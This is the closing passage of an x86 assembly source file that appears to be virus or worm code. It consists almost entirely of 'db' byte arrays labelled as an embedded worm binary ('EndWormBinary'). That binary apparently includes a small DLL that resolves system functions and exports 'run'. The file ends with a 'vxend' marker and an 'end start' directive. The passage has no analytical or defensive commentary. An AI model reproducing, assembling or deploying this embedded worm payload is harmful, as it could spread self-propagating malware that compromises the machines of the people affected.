db 000h, 00fh, 0b7h, 0d6h, 023h, 0c1h, 00fh, 0afh, 0c2h, 033h, 0d2h, 0f7h, 0f1h, 003h
db 0c7h, 0ebh, 002h, 08bh, 0c7h, 05fh, 05eh, 0c3h, 053h, 08bh, 05ch, 024h, 008h, 056h
db 08bh, 074h, 024h, 010h, 083h, 0feh, 004h, 07ch, 01bh, 057h, 08bh, 0feh, 0c1h, 0efh
db 002h, 08bh, 0c7h, 0f7h, 0d8h, 08dh, 034h, 086h, 0e8h, 0d0h, 0feh, 0ffh, 0ffh, 089h
db 003h, 083h, 0c3h, 004h, 04fh, 075h, 0f3h, 05fh, 085h, 0f6h, 074h, 00fh, 0e8h, 0beh
db 0feh, 0ffh, 0ffh, 08bh, 04ch, 024h, 00ch, 088h, 004h, 031h, 04eh, 075h, 0f1h, 08bh
db 044h, 024h, 00ch, 05eh, 05bh, 0c3h, 06ah, 001h, 058h, 0c2h, 00ch, 000h, 055h, 08bh
db 0ech, 053h, 056h, 057h, 08dh, 005h, 030h, 04dh, 000h, 000h, 089h, 018h, 089h, 068h
db 004h, 089h, 070h, 008h, 089h, 078h, 00ch, 0ffh, 075h, 020h, 0ffh, 075h, 01ch, 0ffh
db 075h, 018h, 0ffh, 075h, 014h, 0ffh, 075h, 010h, 0ffh, 075h, 00ch, 0ffh, 075h, 008h
db 0e8h, 01dh, 000h, 000h, 000h, 083h, 0c4h, 01ch, 08dh, 005h, 030h, 04dh, 000h, 000h
db 08bh, 018h, 08bh, 068h, 004h, 08bh, 070h, 008h, 08bh, 078h, 00ch, 05fh, 05eh, 033h
db 0c0h, 05bh, 05dh, 0c2h, 01ch, 000h, 055h, 08bh, 0ech, 08bh, 045h, 008h, 085h, 0c0h
db 00fh, 084h, 08fh, 002h, 000h, 000h, 08bh, 04dh, 00ch, 085h, 0c9h, 00fh, 084h, 084h
db 002h, 000h, 000h, 068h, 0e8h, 015h, 000h, 000h, 0a3h, 0c8h, 04ch, 000h, 000h, 089h
db 00dh, 0cch, 04ch, 000h, 000h, 0ffh, 0d0h, 085h, 0c0h, 0a3h, 018h, 04dh, 000h, 000h
db 074h, 025h, 068h, 0dch, 015h, 000h, 000h, 050h, 0ffh, 015h, 0cch, 04ch, 000h, 000h
db 085h, 0c0h, 0a3h, 014h, 04dh, 000h, 000h, 074h, 010h, 06ah, 000h, 068h, 0c8h, 015h
db 000h, 000h, 068h, 07ch, 015h, 000h, 000h, 06ah, 000h, 0ffh, 0d0h, 068h, 070h, 015h
db 000h, 000h, 0ffh, 015h, 0c8h, 04ch, 000h, 000h, 085h, 0c0h, 0a3h, 020h, 04dh, 000h
db 000h, 00fh, 084h, 02ch, 002h, 000h, 000h, 068h, 0a4h, 014h, 000h, 000h, 0ffh, 015h
db 0c8h, 04ch, 000h, 000h, 085h, 0c0h, 0a3h, 024h, 04dh, 000h, 000h, 074h, 027h, 068h
db 064h, 015h, 000h, 000h, 050h, 0ffh, 015h, 0cch, 04ch, 000h, 000h, 068h, 054h, 015h
db 000h, 000h, 0a3h, 0e4h, 04ch, 000h, 000h, 0ffh, 035h, 024h, 04dh, 000h, 000h, 0ffh
db 015h, 0cch, 04ch, 000h, 000h, 0a3h, 0f4h, 04ch, 000h, 000h, 068h, 04ch, 015h, 000h
db 000h, 0ffh, 035h, 020h, 04dh, 000h, 000h, 0ffh, 015h, 0cch, 04ch, 000h, 000h, 085h
db 0c0h, 0a3h, 0d0h, 04ch, 000h, 000h, 00fh, 084h, 0bbh, 001h, 000h, 000h, 068h, 044h
db 015h, 000h, 000h, 0ffh, 035h, 020h, 04dh, 000h, 000h, 0ffh, 015h, 0cch, 04ch, 000h
db 000h, 085h, 0c0h, 0a3h, 0d4h, 04ch, 000h, 000h, 00fh, 084h, 09dh, 001h, 000h, 000h
db 068h, 03ch, 015h, 000h, 000h, 0ffh, 035h, 020h, 04dh, 000h, 000h, 0ffh, 015h, 0cch
db 04ch, 000h, 000h, 085h, 0c0h, 0a3h, 0d8h, 04ch, 000h, 000h, 00fh, 084h, 07fh, 001h
db 000h, 000h, 068h, 034h, 015h, 000h, 000h, 0ffh, 035h, 020h, 04dh, 000h, 000h, 0ffh
db 015h, 0cch, 04ch, 000h, 000h, 085h, 0c0h, 0a3h, 0dch, 04ch, 000h, 000h, 00fh, 084h
db 061h, 001h, 000h, 000h, 068h, 02ch, 015h, 000h, 000h, 0ffh, 035h, 020h, 04dh, 000h
db 000h, 0ffh, 015h, 0cch, 04ch, 000h, 000h, 085h, 0c0h, 0a3h, 0e0h, 04ch, 000h, 000h
db 00fh, 084h, 043h, 001h, 000h, 000h, 068h, 024h, 015h, 000h, 000h, 0ffh, 035h, 020h
db 04dh, 000h, 000h, 0ffh, 015h, 0cch, 04ch, 000h, 000h, 085h, 0c0h, 0a3h, 0e8h, 04ch
db 000h, 000h, 00fh, 084h, 025h, 001h, 000h, 000h, 068h, 01ch, 015h, 000h, 000h, 0ffh
db 035h, 020h, 04dh, 000h, 000h, 0ffh, 015h, 0cch, 04ch, 000h, 000h, 085h, 0c0h, 0a3h
db 008h, 04dh, 000h, 000h, 00fh, 084h, 007h, 001h, 000h, 000h, 068h, 014h, 015h, 000h
db 000h, 0ffh, 035h, 020h, 04dh, 000h, 000h, 0ffh, 015h, 0cch, 04ch, 000h, 000h, 085h
db 0c0h, 0a3h, 00ch, 04dh, 000h, 000h, 00fh, 084h, 0e9h, 000h, 000h, 000h, 068h, 00ch
db 015h, 000h, 000h, 0ffh, 035h, 020h, 04dh, 000h, 000h, 0ffh, 015h, 0cch, 04ch, 000h
db 000h, 085h, 0c0h, 0a3h, 010h, 04dh, 000h, 000h, 00fh, 084h, 0cbh, 000h, 000h, 000h
db 068h, 000h, 015h, 000h, 000h, 0ffh, 035h, 024h, 04dh, 000h, 000h, 0ffh, 015h, 0cch
db 04ch, 000h, 000h, 085h, 0c0h, 0a3h, 000h, 04dh, 000h, 000h, 00fh, 084h, 0adh, 000h
db 000h, 000h, 068h, 0f4h, 014h, 000h, 000h, 0ffh, 035h, 024h, 04dh, 000h, 000h, 0ffh
db 015h, 0cch, 04ch, 000h, 000h, 085h, 0c0h, 0a3h, 0f8h, 04ch, 000h, 000h, 00fh, 084h
db 08fh, 000h, 000h, 000h, 068h, 0e8h, 014h, 000h, 000h, 0ffh, 035h, 024h, 04dh, 000h
db 000h, 0ffh, 015h, 0cch, 04ch, 000h, 000h, 085h, 0c0h, 0a3h, 0fch, 04ch, 000h, 000h
db 074h, 075h, 068h, 0dch, 014h, 000h, 000h, 0ffh, 035h, 024h, 04dh, 000h, 000h, 0ffh
db 015h, 0cch, 04ch, 000h, 000h, 085h, 0c0h, 0a3h, 004h, 04dh, 000h, 000h, 074h, 05bh
db 068h, 0d4h, 014h, 000h, 000h, 0ffh, 035h, 020h, 04dh, 000h, 000h, 0ffh, 015h, 0cch
db 04ch, 000h, 000h, 068h, 0cch, 014h, 000h, 000h, 0a3h, 0f0h, 04ch, 000h, 000h, 0ffh
db 035h, 020h, 04dh, 000h, 000h, 0ffh, 015h, 0cch, 04ch, 000h, 000h, 0ffh, 075h, 020h
db 0a3h, 0ech, 04ch, 000h, 000h, 0ffh, 075h, 01ch, 0ffh, 075h, 018h, 0ffh, 075h, 014h
db 0ffh, 075h, 010h, 0e8h, 0ceh, 0f9h, 0ffh, 0ffh, 0ffh, 035h, 020h, 04dh, 000h, 000h
db 0e8h, 02ch, 000h, 000h, 000h, 0ffh, 035h, 024h, 04dh, 000h, 000h, 0e8h, 021h, 000h
db 000h, 000h, 083h, 0c4h, 01ch, 0ebh, 018h, 0ffh, 035h, 020h, 04dh, 000h, 000h, 0e8h
db 011h, 000h, 000h, 000h, 0ffh, 035h, 024h, 04dh, 000h, 000h, 0e8h, 006h, 000h, 000h
db 000h, 059h, 059h, 033h, 0c0h, 05dh, 0c3h, 0a1h, 0e4h, 04ch, 000h, 000h, 085h, 0c0h
db 074h, 006h, 0ffh, 074h, 024h, 004h, 0ffh, 0d0h, 0c3h, 0cch, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 005h, 09ch
db 0c5h, 041h, 000h, 000h, 000h, 000h, 072h, 04dh, 000h, 000h, 001h, 000h, 000h, 000h
db 001h, 000h, 000h, 000h, 001h, 000h, 000h, 000h, 068h, 04dh, 000h, 000h, 06ch, 04dh
db 000h, 000h, 070h, 04dh, 000h, 000h, 0c4h, 049h, 000h, 000h, 078h, 04dh, 000h, 000h
db 000h, 000h, 061h, 02eh, 064h, 06ch, 06ch, 000h, 072h, 075h, 06eh, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 010h, 000h, 000h, 010h, 000h, 000h, 000h, 023h, 039h
db 076h, 039h, 040h, 03dh, 095h, 03dh, 000h, 020h, 000h, 000h, 018h, 000h, 000h, 000h
db 056h, 031h, 0abh, 031h, 033h, 032h, 0a7h, 032h, 0bfh, 032h, 025h, 034h, 04dh, 034h
db 000h, 000h, 000h, 030h, 000h, 000h, 0e8h, 000h, 000h, 000h, 0d2h, 032h, 0e2h, 032h
db 03eh, 033h, 053h, 033h, 07ch, 033h, 080h, 033h, 084h, 033h, 088h, 033h, 08ch, 033h
db 090h, 033h, 094h, 033h, 098h, 033h, 09fh, 033h, 0a9h, 033h, 0c0h, 033h, 0d7h, 033h
db 0eah, 033h, 003h, 034h, 025h, 034h, 033h, 034h, 040h, 034h, 0d3h, 034h, 0dch, 034h
db 0fch, 034h, 012h, 035h, 027h, 035h, 04eh, 035h, 063h, 035h, 073h, 035h, 083h, 035h
db 08ah, 035h, 0a5h, 035h, 0fbh, 035h, 00dh, 036h, 038h, 036h, 047h, 036h, 022h, 037h
db 03ch, 037h, 04ch, 037h, 053h, 037h, 05ch, 037h, 0a1h, 037h, 0b8h, 037h, 0bfh, 037h
db 0c8h, 037h, 0d7h, 037h, 00fh, 038h, 018h, 038h, 033h, 038h, 041h, 038h, 052h, 038h
db 067h, 038h, 087h, 038h, 097h, 038h, 0a7h, 038h, 0dch, 038h, 0e3h, 038h, 0f3h, 038h
db 006h, 039h, 014h, 039h, 01dh, 039h, 032h, 039h, 047h, 039h, 086h, 039h, 09bh, 039h
db 0a8h, 039h, 0b1h, 039h, 0cah, 039h, 0d3h, 039h, 0f6h, 039h, 004h, 03ah, 014h, 03ah
db 02ah, 03ah, 03fh, 03ah, 05ch, 03ah, 06dh, 03ah, 084h, 03ah, 08dh, 03ah, 0a7h, 03ah
db 0b5h, 03ah, 0deh, 03ah, 0f3h, 03ah, 001h, 03bh, 00dh, 03bh, 075h, 03bh, 0e9h, 03bh
db 00ah, 03ch, 065h, 03ch, 085h, 03ch, 08eh, 03ch, 09fh, 03ch, 0aeh, 03ch, 0beh, 03ch
db 0c5h, 03ch, 0d9h, 03ch, 0f7h, 03ch, 0feh, 03ch, 008h, 03dh, 011h, 03dh, 0c4h, 03dh
db 0f6h, 03dh, 010h, 03eh, 038h, 03eh, 043h, 03eh, 06bh, 03eh, 07ch, 03eh, 086h, 03eh
db 08eh, 03eh, 0d7h, 03eh, 0e0h, 03eh, 020h, 03fh, 000h, 000h, 000h, 040h, 000h, 000h
db 028h, 001h, 000h, 000h, 0ebh, 030h, 0f9h, 030h, 013h, 031h, 026h, 031h, 030h, 031h
db 03bh, 031h, 079h, 031h, 082h, 031h, 0a2h, 031h, 0b1h, 031h, 0bfh, 031h, 0d2h, 031h
db 0e6h, 031h, 0f3h, 031h, 024h, 032h, 02bh, 032h, 0a4h, 032h, 0abh, 032h, 0c2h, 032h
db 0cbh, 032h, 0f0h, 032h, 002h, 033h, 01eh, 033h, 036h, 033h, 045h, 033h, 056h, 033h
db 0cdh, 033h, 0d9h, 033h, 033h, 035h, 03ch, 035h, 042h, 035h, 049h, 035h, 054h, 035h
db 05bh, 035h, 060h, 035h, 068h, 035h, 06eh, 035h, 073h, 035h, 07ch, 035h, 082h, 035h
db 054h, 036h, 05dh, 036h, 063h, 036h, 06ah, 036h, 071h, 036h, 078h, 036h, 070h, 038h
db 077h, 038h, 084h, 038h, 094h, 038h, 099h, 038h, 0aah, 038h, 0c0h, 038h, 0ceh, 038h
db 0dbh, 038h, 0cch, 039h, 0fah, 039h, 02ch, 03ah, 031h, 03ah, 037h, 03ah, 040h, 03ah
db 047h, 03ah, 04eh, 03ah, 055h, 03ah, 05eh, 03ah, 063h, 03ah, 06ch, 03ah, 072h, 03ah
db 079h, 03ah, 084h, 03ah, 08ah, 03ah, 091h, 03ah, 098h, 03ah, 09fh, 03ah, 0a4h, 03ah
db 0a9h, 03ah, 0afh, 03ah, 0b5h, 03ah, 0bah, 03ah, 0bfh, 03ah, 0c5h, 03ah, 0cbh, 03ah
db 0d2h, 03ah, 0ddh, 03ah, 0e3h, 03ah, 0e9h, 03ah, 0f0h, 03ah, 0fbh, 03ah, 001h, 03bh
db 007h, 03bh, 00eh, 03bh, 019h, 03bh, 01fh, 03bh, 025h, 03bh, 02ch, 03bh, 037h, 03bh
db 03dh, 03bh, 043h, 03bh, 04ah, 03bh, 055h, 03bh, 05bh, 03bh, 061h, 03bh, 068h, 03bh
db 073h, 03bh, 079h, 03bh, 07fh, 03bh, 086h, 03bh, 091h, 03bh, 097h, 03bh, 09dh, 03bh
db 0a4h, 03bh, 0afh, 03bh, 0b5h, 03bh, 0bbh, 03bh, 0c2h, 03bh, 0cdh, 03bh, 0d3h, 03bh
db 0d9h, 03bh, 0e0h, 03bh, 0ebh, 03bh, 0f1h, 03bh, 0f7h, 03bh, 0feh, 03bh, 009h, 03ch
db 00fh, 03ch, 015h, 03ch, 01ch, 03ch, 023h, 03ch, 029h, 03ch, 02fh, 03ch, 036h, 03ch
db 03dh, 03ch, 043h, 03ch, 049h, 03ch, 04eh, 03ch, 053h, 03ch, 059h, 03ch, 05fh, 03ch
db 067h, 03ch, 07eh, 03ch, 089h, 03ch, 099h, 03ch, 0a4h, 03ch, 0b4h, 03ch, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
db 000h, 000h, 000h, 000h, 000h, 000h
EndWormBinary:

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
vxend:
nop ;For moving the code for testing

end start
end
